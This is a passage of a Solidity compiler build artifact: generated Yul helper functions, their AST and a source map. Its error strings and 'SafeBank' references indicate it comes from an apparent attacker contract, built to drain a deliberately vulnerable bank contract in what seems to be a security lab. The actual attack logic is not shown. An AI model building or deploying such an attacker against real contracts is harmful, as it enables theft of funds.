                      "name": "abi_encode_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3566:124:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3566:131:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3558:4:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3436:9:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "3451:4:4",
                "type": ""
              }
            ],
            "src": "3285:419:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3881:248:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3891:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3903:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3914:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3899:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3899:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3891:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3938:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3949:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3934:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3934:17:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "3957:4:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3963:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "3953:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3953:20:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "3927:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3927:47:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3927:47:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3983:139:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "4117:4:4"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3991:124:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3991:131:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3983:4:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3861:9:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "3876:4:4",
                "type": ""
              }
            ],
            "src": "3710:419:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4233:124:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4243:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "4255:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "4266:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "4251:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4251:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "4243:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "4323:6:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "4336:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "4347:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "4332:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "4332:17:4"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_uint256_to_t_uint256_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "4279:43:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4279:71:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "4279:71:4"
                }
              ]
            },
            "name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "4205:9:4",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "4217:6:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "4228:4:4",
                "type": ""
              }
            ],
            "src": "4135:222:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4459:73:4",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "4476:3:4"
                      },
                      {
                        "name": "length",
                        "nodeType": "YulIdentifier",
                        "src": "4481:6:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "4469:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4469:19:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "4469:19:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4497:29:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "4516:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "4521:4:4",
                        "type": "",
                        "value": "0x20"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "4512:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4512:14:4"
                  },
                  "variableNames": [
                    {
                      "name": "updated_pos",
                      "nodeType": "YulIdentifier",
                      "src": "4497:11:4"
                    }
                  ]
                }
              ]
            },
            "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "4431:3:4",
                "type": ""
              },
              {
                "name": "length",
                "nodeType": "YulTypedName",
                "src": "4436:6:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "updated_pos",
                "nodeType": "YulTypedName",
                "src": "4447:11:4",
                "type": ""
              }
            ],
            "src": "4363:169:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4582:261:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4592:25:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4615:1:4"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4597:17:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4597:20:4"
                  },
                  "variableNames": [
                    {
                      "name": "x",
                      "nodeType": "YulIdentifier",
                      "src": "4592:1:4"
                    }
                  ]
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4626:25:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4649:1:4"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "4631:17:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4631:20:4"
                  },
                  "variableNames": [
                    {
                      "name": "y",
                      "nodeType": "YulIdentifier",
                      "src": "4626:1:4"
                    }
                  ]
                },
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "4789:22:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "panic_error_0x11",
                            "nodeType": "YulIdentifier",
                            "src": "4791:16:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "4791:18:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "4791:18:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4710:1:4"
                      },
                      {
                        "arguments": [
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "4717:66:4",
                            "type": "",
                            "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                          },
                          {
                            "name": "y",
                            "nodeType": "YulIdentifier",
                            "src": "4785:1:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "4713:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "4713:74:4"
                      }
                    ],
                    "functionName": {
                      "name": "gt",
                      "nodeType": "YulIdentifier",
                      "src": "4707:2:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4707:81:4"
                  },
                  "nodeType": "YulIf",
                  "src": "4704:2:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "4821:16:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "4832:1:4"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "4835:1:4"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "4828:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4828:9:4"
                  },
                  "variableNames": [
                    {
                      "name": "sum",
                      "nodeType": "YulIdentifier",
                      "src": "4821:3:4"
                    }
                  ]
                }
              ]
            },
            "name": "checked_add_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "x",
                "nodeType": "YulTypedName",
                "src": "4569:1:4",
                "type": ""
              },
              {
                "name": "y",
                "nodeType": "YulTypedName",
                "src": "4572:1:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "sum",
                "nodeType": "YulTypedName",
                "src": "4578:3:4",
                "type": ""
              }
            ],
            "src": "4538:305:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4894:51:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "4904:35:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "4933:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "4915:17:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "4915:24:4"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "4904:7:4"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "4876:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "4886:7:4",
                "type": ""
              }
            ],
            "src": "4849:96:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "4996:81:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5006:65:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "5021:5:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5028:42:4",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "5017:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5017:54:4"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "5006:7:4"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "4978:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "4988:7:4",
                "type": ""
              }
            ],
            "src": "4951:126:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5128:32:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5138:16:4",
                  "value": {
                    "name": "value",
                    "nodeType": "YulIdentifier",
                    "src": "5149:5:4"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "5138:7:4"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5110:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "5120:7:4",
                "type": ""
              }
            ],
            "src": "5083:77:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5242:82:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5252:66:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "5312:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_contract$_SafeBank_$424_to_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "5265:46:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5265:53:4"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "5252:9:4"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_SafeBank_$424_to_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5222:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "5232:9:4",
                "type": ""
              }
            ],
            "src": "5166:158:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5406:53:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "5416:37:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "5447:5:4"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "5429:17:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5429:24:4"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "5416:9:4"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_SafeBank_$424_to_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5386:5:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "5396:9:4",
                "type": ""
              }
            ],
            "src": "5330:129:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5493:152:4",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5510:1:4",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5513:77:4",
                        "type": "",
                        "value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "5503:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5503:88:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5503:88:4"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5607:1:4",
                        "type": "",
                        "value": "4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5610:4:4",
                        "type": "",
                        "value": "0x11"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "5600:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5600:15:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5600:15:4"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5631:1:4",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "5634:4:4",
                        "type": "",
                        "value": "0x24"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "5624:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5624:15:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "5624:15:4"
                }
              ]
            },
            "name": "panic_error_0x11",
            "nodeType": "YulFunctionDefinition",
            "src": "5465:180:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5694:79:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "5751:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5760:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5763:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "5753:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "5753:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "5753:12:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "5717:5:4"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "5742:5:4"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address",
                              "nodeType": "YulIdentifier",
                              "src": "5724:17:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "5724:24:4"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "5714:2:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "5714:35:4"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "5707:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5707:43:4"
                  },
                  "nodeType": "YulIf",
                  "src": "5704:2:4"
                }
              ]
            },
            "name": "validator_revert_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5687:5:4",
                "type": ""
              }
            ],
            "src": "5651:122:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "5822:79:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "5879:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5888:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "5891:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "5881:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "5881:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "5881:12:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "5845:5:4"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "5870:5:4"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_uint256",
                              "nodeType": "YulIdentifier",
                              "src": "5852:17:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "5852:24:4"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "5842:2:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "5842:35:4"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "5835:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "5835:43:4"
                  },
                  "nodeType": "YulIf",
                  "src": "5832:2:4"
                }
              ]
            },
            "name": "validator_revert_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "5815:5:4",
                "type": ""
              }
            ],
            "src": "5779:122:4"
          }
        ]
      },
      "contents": "{\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_contract$_SafeBank_$424_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_SafeBank_$424_to_t_address(value))\n    }\n\n    function abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 23)\n\n        mstore(add(pos, 0), \"Only owner can withdraw\")\n\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 57)\n\n        mstore(add(pos, 0), \"Need to send some Ether to attac\")\n\n        mstore(add(pos, 32), \"k less than target amount\")\n\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 62)\n\n        mstore(add(pos, 0), \"Target amount must be less than \")\n\n        mstore(add(pos, 32), \"balance of vulnerable contract\")\n\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_contract$_SafeBank_$424__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_SafeBank_$424_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_SafeBank_$424_to_t_address(value) -> converted {\n        converted := convert_t_contract$_SafeBank_$424_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_SafeBank_$424_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n",
      "id": 4,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "sourceMap": "126:2816:1:-:0;;;475:1;430:46;;572:201;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;717:18;695:10;;:41;;;;;;;;;;;;;;;;;;755:10;747:5;;:18;;;;;;;;;;;;;;;;;;572:201;126:2816;;7:159:4;;103:6;97:13;88:22;;119:41;154:5;119:41;:::i;:::-;78:88;;;;:::o;172:300::-;;299:2;287:9;278:7;274:23;270:32;267:2;;;315:1;312;305:12;267:2;358:1;383:72;447:7;438:6;427:9;423:22;383:72;:::i;:::-;373:82;;329:136;257:215;;;;:::o;478:104::-;;552:24;570:5;552:24;:::i;:::-;541:35;;531:51;;;:::o;588:126::-;;665:42;658:5;654:54;643:65;;633:81;;;:::o;720:138::-;801:32;827:5;801:32;:::i;:::-;794:5;791:43;781:2;;848:1;845;838:12;781:2;771:87;:::o;126:2816:1:-;;;;;;;",
